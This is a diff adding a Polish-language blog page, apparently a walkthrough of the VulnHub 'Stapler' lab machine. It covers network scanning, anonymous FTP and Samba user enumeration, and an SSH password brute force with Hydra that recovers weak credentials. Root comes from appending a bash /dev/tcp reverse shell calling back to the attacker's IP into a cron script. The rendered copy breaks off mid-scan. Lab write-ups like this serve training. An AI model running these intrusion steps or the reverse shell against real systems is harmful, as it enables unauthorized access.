@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Stapler | Mateusz Suszczyk</title>
+<meta name="keywords" content="Linux, Easy" />
+<meta name="description" content="Average beginner/intermediate VM. May find it easy/hard (depends on YOUR background). There are multiple methods to-do this machine. At least two (2) paths to get a limited shell. At least three (3) ways to get a root access">
+<meta name="author" content="Mateusz Suszczyk">
+<link rel="canonical" href="https://suszczyk.github.io/posts/vulnhub/stapler/" />
+<link crossorigin="anonymous" href="../../../assets/css/stylesheet.min.05ec22396353f5838fc267c8a7e9d490b0f9679d599623d1abcb52b3a80b2af6.css" integrity="sha256-BewiOWNT9YOPwmfIp&#43;nUkLD5Z51ZliPRq8tSs6gLKvY=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="../../../assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://suszczyk.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://suszczyk.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://suszczyk.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://suszczyk.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://suszczyk.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.92.2" />
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Stapler" />
+<meta property="og:description" content="Average beginner/intermediate VM. May find it easy/hard (depends on YOUR background). There are multiple methods to-do this machine. At least two (2) paths to get a limited shell. At least three (3) ways to get a root access" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://suszczyk.github.io/posts/vulnhub/stapler/" />
+<meta property="og:image" content="https://suszczyk.github.io/thumbnails/Stapler.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-06T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2022-08-06T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://suszczyk.github.io/thumbnails/Stapler.png" />
+<meta name="twitter:title" content="Stapler"/>
+<meta name="twitter:description" content="Average beginner/intermediate VM. May find it easy/hard (depends on YOUR background). There are multiple methods to-do this machine. At least two (2) paths to get a limited shell. At least three (3) ways to get a root access"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Posts",
+      "item": "https://suszczyk.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Stapler",
+      "item": "https://suszczyk.github.io/posts/vulnhub/stapler/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Stapler",
+  "name": "Stapler",
+  "description": "Average beginner/intermediate VM. May find it easy/hard (depends on YOUR background). There are multiple methods to-do this machine. At least two (2) paths to get a limited shell. At least three (3) ways to get a root access",
+  "keywords": [
+    "Linux", "Easy"
+  ],
+  "articleBody": "Jako pierwsze wykonałem standardowy skan swojej sieci.\n┌[parrot@parrot]─[~/vulnhub/stapler] └╼[★ ]$sudo netdiscover -r 192.168.2.0/24 Currently scanning: Finished! | Screen View: Unique Hosts 126 Captured ARP Req/Rep packets, from 4 hosts. Total size: 7560 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.2.1 00:50:56:c0:00:08 106 6360 VMware, Inc. 192.168.2.2 00:50:56:f0:ed:fa 15 900 VMware, Inc. 192.168.2.144 00:0c:29:5b:05:48 2 120 VMware, Inc. 192.168.2.254 00:50:56:e2:f7:dc 3 180 VMware, Inc. Adres IP: 192.168.2.144.\n NMap ┌[parrot@parrot]─[~/vulnhub/stapler] └╼[★ ]$nmap -sC -sV -p- 192.168.2.144 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-05 13:48 CEST Nmap scan report for 192.168.2.144 Host is up (0.012s latency). Not shown: 65523 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 20/tcp closed ftp-data 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Cant get directory listing: PASV failed: 550 Permission denied. | ftp-syst: | STAT: | FTP server status: | Connected to 192.168.2.128 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA) | 256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA) |_ 256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519) 53/tcp open domain dnsmasq 2.75 | dns-nsid: |_ bind.version: dnsmasq-2.75 80/tcp open http PHP cli server 5.5 or later |_http-title: 404 Not Found 123/tcp closed ntp 137/tcp closed netbios-ns 138/tcp closed netbios-dgm 139/tcp open netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP) 666/tcp open doom? | fingerprint-strings: | NULL: | message2.jpgUT | QWux | DL[E | #;3[ | \\xf6 | u([r | qYQq | Y_?n2 | 3\u0026M~{ | 9-a)T | L}AJ |_ .npy.9 3306/tcp open mysql MySQL 5.7.12-0ubuntu1 | mysql-info: | Protocol: 10 | Version: 5.7.12-0ubuntu1 | Thread ID: 8 | Capabilities flags: 63487 | Some Capabilities: Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, ConnectWithDatabase, Sp eaks41ProtocolNew, SupportsTransactions, FoundRows, IgnoreSpaceBeforeParenthesis, ODBCClient, LongPassword, SupportsCompression, DontAllowDa tabaseTableColumn, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins | Status: Autocommit | Salt: \\x17^\\x15n\\x1Ec|YMX2\\x1F_EU\\x16\\x11\\x077I |_ Auth Plugin Name: mysql_native_password 12380/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesnt have a title (text/html). Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.9-Ubuntu) | Computer name: red | NetBIOS computer name: RED\\x00 | Domain name: \\x00 | FQDN: red |_ System time: 2022-08-05T14:50:52+01:00 |_clock-skew: mean: 1h40m00s, deviation: 34m38s, median: 1h59m59s |_nbstat: NetBIOS name: RED, NetBIOS user: , NetBIOS MAC:  (unknown) | smb2-time: | date: 2022-08-05T13:50:53 |_ start_date: N/A | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Widzimy kilka otwartych portów. Zacznę od enumeracji FTP na porcie 21.\n FTP ┌[parrot@parrot]─[~/vulnhub/stapler] └╼[★ ]$ftp 192.168.2.144 Connected to 192.168.2.144. 220- 220-|-----------------------------------------------------------------------------------------| 220-| Harry, make sure to update the banner when you get a chance to show who has access here | 220-|-----------------------------------------------------------------------------------------| 220- 220 Name (192.168.2.144:parrot): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 107 Jun 03 2016 note 226 Directory send OK. ftp get note local: note remote: note 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note (107 bytes). 226 Transfer complete. 107 bytes received in 0.02 secs (6.6488 kB/s) ftp ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 107 Jun 03 2016 note 226 Directory send OK. ftp exit 221 Goodbye. Łączenie na FTP jako anonymous powiodło się. Pojawił się nawet baner z nazwą użytkownika harry, co na pewno przyda nam się później. Udało się także pobrać plik note. Jego zawartość to:\nElly, make sure you update the payload information. Leave it in your FTP account once your are done, John.\nOk, zatem mamy już 3 potencjalnych użytkowników.\nusers.txt\nharry elly john  Port 22 - OpenSSH 7.2p2 Mamy możliwość enumeracji userów.\nPoczątkowo skrypt 40136.py nie działał ze względu na błąd AttributeError: module 'time' has no attribute 'clock'. Po zmianie time.clock() na time.perf_counter(). Skrypt zaczął działać poprawnie.\nSam skrypt wykonam potem, gdy przeprowadzę enumerację wszystkich usług i portów.\n Port 80 - HTTP Z NMapa oraz po interfejsie widać, że to PHP. Przeprowadziłem skan FeroxBusterem, ale nie znalazłem nic konkretnego poza kilkoma pliczkami z folderu głównego, któregoś usera. Były to pliki m.in. bash.rc, .bash_logout, .profile.\n Port 666 - Doom Mamy otwarty nietypowy port. Zazwyczaj z tego portu korzysta gierka Doom. W tym przypadku, gdy użyłem nc do podejrzenia co odpowiada ten port, otrzymałem dziwną odpowiedź.\nWidać już tutaj, że będzie to plik graficzny message2.jpg.\nnc 192.168.2.144 666  file.png Po przekierowaniu tego do file.png próbowałem zobaczyć w edytorze graficznym co to jest, ale plik nie otwierał się poprawnie.\nOkazało się, że pliczek należy rozpakować i właśnie w nim był pliczek message2.jpg.\nOkazało się, że to easter egg, chociaż mamy dodatkowego usera scotta.\nUżyłem również exiftool. Jedna ze zmiennych miała zapisany tekst.\nCookie, tylko gdzie…\n Port 3306 - MySQL 5.7.12 Gdy tylko mam dokładne wersje oprogramowania, zawsze sprawdzam czy są jakieś exploity w searchsploit. W tym przypadku mamy tylko Integer Overflow, co nam nie pomoże.\n Port 12380 - Apache httpd 2.4.18 W kodzie źródłowym znalazłem ciekawą notkę.\nKolejny user - zoe. Natomiast nie ma tutaj nic więcej.\n enum4linux Zauważyłem, że zawsze, gdy jest Samba, warto użyć enum4linux.\n┌[parrot@parrot]─[~/vulnhub/stapler] └╼[★ ]$enum4linux 192.168.2.144 ... ... ========================================== [294/813] | Share Enumeration on 192.168.2.144 | ========================================== Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers kathy Disk Fred, What are we doing here? tmp Disk All temporary files should be stored here IPC$ IPC IPC Service (red server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available [+] Attempting to map shares on 192.168.2.144 //192.168.2.144/print$ Mapping: DENIED, Listing: N/A //192.168.2.144/kathy Mapping: OK, Listing: OK //192.168.2.144/tmp Mapping: OK, Listing: OK //192.168.2.144/IPC$ [E] Cant understand response: NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\* ===================================================== | Password Policy Information for 192.168.2.144 | ===================================================== [+] Attaching to 192.168.2.144 using a NULL share [+] Trying protocol 139/SMB... [+] Found domain(s): [+] RED [+] Builtin [+] Enumerating users using SID S-1-22-1 and logon username '', password '' S-1-22-1-1000 Unix User\\peter (Local User) S-1-22-1-1001 Unix User\\RNunemaker (Local User) S-1-22-1-1002 Unix User\\ETollefson (Local User) S-1-22-1-1003 Unix User\\DSwanger (Local User) S-1-22-1-1004 Unix User\\AParnell (Local User) S-1-22-1-1005 Unix User\\SHayslett (Local User) S-1-22-1-1006 Unix User\\MBassin (Local User) S-1-22-1-1007 Unix User\\JBare (Local User) S-1-22-1-1008 Unix User\\LSolum (Local User) S-1-22-1-1009 Unix User\\IChadwick (Local User) S-1-22-1-1010 Unix User\\MFrei (Local User) S-1-22-1-1011 Unix User\\SStroud (Local User) S-1-22-1-1012 Unix User\\CCeaser (Local User) S-1-22-1-1013 Unix User\\JKanode (Local User) S-1-22-1-1014 Unix User\\CJoo (Local User) S-1-22-1-1015 Unix User\\Eeth (Local User) S-1-22-1-1016 Unix User\\LSolum2 (Local User) S-1-22-1-1017 Unix User\\JLipps (Local User) S-1-22-1-1018 Unix User\\jamie (Local User) S-1-22-1-1019 Unix User\\Sam (Local User) S-1-22-1-1020 Unix User\\Drew (Local User) S-1-22-1-1021 Unix User\\jess (Local User) S-1-22-1-1022 Unix User\\SHAY (Local User) S-1-22-1-1023 Unix User\\Taylor (Local User) S-1-22-1-1024 Unix User\\mel (Local User) S-1-22-1-1025 Unix User\\kai (Local User) S-1-22-1-1026 Unix User\\zoe (Local User) S-1-22-1-1027 Unix User\\NATHAN (Local User) S-1-22-1-1028 Unix User\\www (Local User) S-1-22-1-1029 Unix User\\elly (Local User) Mamy sporo ciekawych informacji. Przede wszystkim jest cała lista użytkowników. Użyję awk, aby utworzyć gotowy plik users.txt ze wszystkimi.\nNajpierw wrzuciłem cały powyższy output do users.txt. Najpierw separatorem była spacja a potem użyłem awk jeszcze raz z separatorem na \\. Tak otrzymałem gotową listę\n┌[parrot@parrot]─[~/vulnhub/stapler] └╼[★ ]$awk '{print $3}' users.txt | awk -F'\\' '{print $2}' peter RNunemaker ETollefson DSwanger AParnell SHayslett MBassin JBare LSolum IChadwick MFrei SStroud CCeaser JKanode CJoo Eeth LSolum2 JLipps jamie Sam Drew jess SHAY Taylor mel kai zoe NATHAN www elly  SSH Enum - Limited shell Gdy mam już całą listę userów, teraz można przeprowadzić próbę brute-force.\n[parrot@parrot]─[~/vulnhub/stapler] └╼[★ ]$hydra -L users.txt -P /opt/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt ssh://192.168.2.144 Hydra v9.1 (c) 2020 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-06 16:06:59 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 814 login tries (l:37/p:22), ~51 tries per task [DATA] attacking ssh://192.168.2.144:22/ [22][ssh] host: 192.168.2.144 login: MFrei password: letmein [STATUS] 269.00 tries/min, 269 tries in 00:01h, 550 to do in 00:03h, 16 active [22][ssh] host: 192.168.2.144 login: Drew password: qwerty [STATUS] 261.00 tries/min, 522 tries in 00:02h, 298 to do in 00:02h, 16 active [STATUS] 262.00 tries/min, 786 tries in 00:03h, 34 to do in 00:01h, 16 active 1 of 1 target successfully completed, 2 valid passwords found [WARNING] Writing restore file because 5 final worker threads did not complete until end. [ERROR] 5 targets did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-06 16:10:11 MFrei:letmein Drew:qwerty\nUżyłem bardzo małego słownika, ale mimo to mamy efekty. Udało mi się zalogować na usera Drew 😃\n Privileges Escalation Mamy dwie ścieżki na roota na pierwszy rzut oka.\n Jądro systemu ma wiele podatności. Część jest wypisana tutaj https://github.com/kkamagui/linux-kernel-exploits.   Mamy uprawnienie write do skryptu, który jest w cronie.\n  Zawartość skryptu:\nDrew@red:/etc/cron.d$ cat /usr/local/sbin/cron-logrotate.sh #Simon, you really need to-do something about this Spróbuję podejść do crona.\nGdy zerkniemy sobie do /etc/cron.d, zobaczymy między innymi nasz skrypcik logrotate.\nDrew@red:/etc/cron.d$ ls -al total 32 drwxr-xr-x 2 root root 4096 Jun 3 2016 . drwxr-xr-x 100 root root 12288 Aug 6 21:25 .. -rw-r--r-- 1 root root 102 Jun 3 2016 .placeholder -rw-r--r-- 1 root root 56 Jun 3 2016 logrotate -rw-r--r-- 1 root root 589 Jul 16 2014 mdadm -rw-r--r-- 1 root root 670 Mar 1 2016 php Jego zawartość to:\n*/5 * * * * root /usr/local/sbin/cron-logrotate.sh Pomogłem sobie stroną https://crontab.guru/, ponieważ nie mam doświadczenia w czytaniu wyrażeń crona.\nJak widać, skrypcik wykonuje się co każde 5 minut. Można więc dopisać prosty reverse shell i otrzymamy roota.\nDopisuję do /usr/local/sbin/cron-logrotate.sh poniższą linię.\n/bin/bash -c 'bash -i \u0026 /dev/tcp/\"192.168.2.128\"/9001 0\u00261' I o równej 21:10 otrzymuję roota 😁\nStapler miał bardzo dużo tzw. rabbit holes. W naszym przypadku były to porty/usługi, które często sprowadzały na zły trop. Finalnie udało się dostać na roota. Myślę, że jeszcze prościej byłoby wykonać exploita na jądrze systemu, ale dzisiaj poćwiczyłem crontaba 😉\n Root proof ",
+  "wordCount" : "1734",
+  "inLanguage": "en",
+  "image":"https://suszczyk.github.io/thumbnails/Stapler.png","datePublished": "2022-08-06T00:00:00Z",
+  "dateModified": "2022-08-06T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Mateusz Suszczyk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://suszczyk.github.io/posts/vulnhub/stapler/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Mateusz Suszczyk",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://suszczyk.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://suszczyk.github.io" accesskey="h" title="Mateusz Suszczyk (Alt + H)">Mateusz Suszczyk</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://suszczyk.github.io/archives/" title="Archiwum">
+                    <span>Archiwum</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/categories/" title="Kategorie">
+                    <span>Kategorie</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/tags/" title="Tagi">
+                    <span>Tagi</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/search/" title="Szukaj">
+                    <span>Szukaj</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://suszczyk.github.io">Home</a>&nbsp;»&nbsp;<a href="https://suszczyk.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Stapler
+    </h1>
+    <div class="post-meta"><span title='2022-08-06 00:00:00 +0000 UTC'>August 6, 2022</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;Mateusz Suszczyk
+
+</div>
+  </header> 
+<figure class="entry-cover"><img loading="lazy" src="https://suszczyk.github.io/thumbnails/Stapler.png" alt="">
+        
+</figure><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#nmap" aria-label="NMap">NMap</a><ul>
+                        
+                <li>
+                    <a href="#ftp" aria-label="FTP">FTP</a></li>
+                <li>
+                    <a href="#port-22---openssh-72p2" aria-label="Port 22 - OpenSSH 7.2p2">Port 22 - OpenSSH 7.2p2</a></li>
+                <li>
+                    <a href="#port-80---http" aria-label="Port 80 - HTTP">Port 80 - HTTP</a></li>
+                <li>
+                    <a href="#port-666---doom" aria-label="Port 666 - Doom">Port 666 - Doom</a></li>
+                <li>
+                    <a href="#port-3306---mysql-5712" aria-label="Port 3306 - MySQL 5.7.12">Port 3306 - MySQL 5.7.12</a></li>
+                <li>
+                    <a href="#port-12380---apache-httpd-2418" aria-label="Port 12380 - Apache httpd 2.4.18">Port 12380 - Apache httpd 2.4.18</a></li>
+                <li>
+                    <a href="#enum4linux" aria-label="enum4linux">enum4linux</a></li>
+                <li>
+                    <a href="#ssh-enum---limited-shell" aria-label="SSH Enum -&amp;gt; Limited shell">SSH Enum -&gt; Limited shell</a></li></ul>
+                </li>
+                <li>
+                    <a href="#privileges-escalation" aria-label="Privileges Escalation">Privileges Escalation</a><ul>
+                        
+                <li>
+                    <a href="#root-proof" aria-label="Root proof">Root proof</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>Jako pierwsze wykonałem standardowy skan swojej sieci.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/vulnhub/stapler<span style="color:#f92672">]</span>
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$sudo netdiscover -r 192.168.2.0/24
+Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                             
+                                                                                                                                           
+ <span style="color:#ae81ff">126</span> Captured ARP Req/Rep packets, from <span style="color:#ae81ff">4</span> hosts.   Total size: <span style="color:#ae81ff">7560</span>                                                                        
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.2.1     00:50:56:c0:00:08    <span style="color:#ae81ff">106</span>    <span style="color:#ae81ff">6360</span>  VMware, Inc.                                                                            
+ 192.168.2.2     00:50:56:f0:ed:fa     <span style="color:#ae81ff">15</span>     <span style="color:#ae81ff">900</span>  VMware, Inc.                                                                            
+ 192.168.2.144   00:0c:29:5b:05:48      <span style="color:#ae81ff">2</span>     <span style="color:#ae81ff">120</span>  VMware, Inc.                                                                            
+ 192.168.2.254   00:50:56:e2:f7:dc      <span style="color:#ae81ff">3</span>     <span style="color:#ae81ff">180</span>  VMware, Inc.
+</code></pre></div><p>Adres IP: <code>192.168.2.144</code>.</p>
+<hr>
+<h1 id="nmap">NMap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/vulnhub/stapler<span style="color:#f92672">]</span>                                                                                                        
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$nmap -sC -sV -p- 192.168.2.144                                                                                                       
+Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-08-05 13:48 CEST                                                                            
+Nmap scan report <span style="color:#66d9ef">for</span> 192.168.2.144                                                                                                          
+Host is up <span style="color:#f92672">(</span>0.012s latency<span style="color:#f92672">)</span>.                                                                                                                
+Not shown: <span style="color:#ae81ff">65523</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>                                                                                           
+PORT      STATE  SERVICE     VERSION                                                                                                        
+20/tcp    closed ftp-data                                                                                                                   
+21/tcp    open   ftp         vsftpd 2.0.8 or later                                                                                          
+| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>                                                                                      
+|_Cant get directory listing: PASV failed: <span style="color:#ae81ff">550</span> Permission denied.                                                                          
+| ftp-syst:                                                                                                                                 
+|   STAT:                                                                                                                                   
+| FTP server status:                                                                                                                        
+|      Connected to 192.168.2.128                                                                                                           
+|      Logged in as ftp                                                                                                                     
+|      TYPE: ASCII                                                                                                                          
+|      No session bandwidth limit                                                                                                           
+|      Session timeout in seconds is <span style="color:#ae81ff">300</span>                                                                                                    
+|      Control connection is plain text                                                                                                     
+|      Data connections will be plain text                                                                                                  
+|      At session startup, client count was <span style="color:#ae81ff">1</span>                                                                                               
+|      vsFTPd 3.0.3 - secure, fast, stable                                                                                                  
+|_End of status                                                                                                                             
+22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+53/tcp    open   domain      dnsmasq 2.75
+| dns-nsid: 
+|_  bind.version: dnsmasq-2.75
+80/tcp    open   http        PHP cli server 5.5 or later
+|_http-title: <span style="color:#ae81ff">404</span> Not Found
+123/tcp   closed ntp
+137/tcp   closed netbios-ns
+138/tcp   closed netbios-dgm
+139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+666/tcp   open   doom?
+| fingerprint-strings: 
+|   NULL: 
+|     message2.jpgUT 
+|     QWux
+|     DL<span style="color:#f92672">[</span>E
+|     <span style="color:#75715e">#;3[</span>
+|     <span style="color:#ae81ff">\x</span>f6
+|     u<span style="color:#f92672">([</span>r
+|     qYQq
+|     Y_?n2
+|     3&amp;M~<span style="color:#f92672">{</span>
+|     9-a<span style="color:#f92672">)</span>T
+|     L<span style="color:#f92672">}</span>AJ
+|_    .npy.9
+3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
+| mysql-info: 
+|   Protocol: <span style="color:#ae81ff">10</span>
+|   Version: 5.7.12-0ubuntu1
+|   Thread ID: <span style="color:#ae81ff">8</span>
+|   Capabilities flags: <span style="color:#ae81ff">63487</span>
+|   Some Capabilities: Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, ConnectWithDatabase, Sp
+eaks41ProtocolNew, SupportsTransactions, FoundRows, IgnoreSpaceBeforeParenthesis, ODBCClient, LongPassword, SupportsCompression, DontAllowDa
+tabaseTableColumn, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: <span style="color:#ae81ff">\x</span>17^<span style="color:#ae81ff">\x</span>15n<span style="color:#ae81ff">\x</span>1Ec|YMX2<span style="color:#ae81ff">\x</span>1F_EU<span style="color:#ae81ff">\x</span>16<span style="color:#ae81ff">\x</span>11<span style="color:#ae81ff">\x</span>077I
+|_  Auth Plugin Name: mysql_native_password
+12380/tcp open   http        Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Site doesnt have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 <span style="color:#f92672">(</span>Samba 4.3.9-Ubuntu<span style="color:#f92672">)</span>
+|   Computer name: red
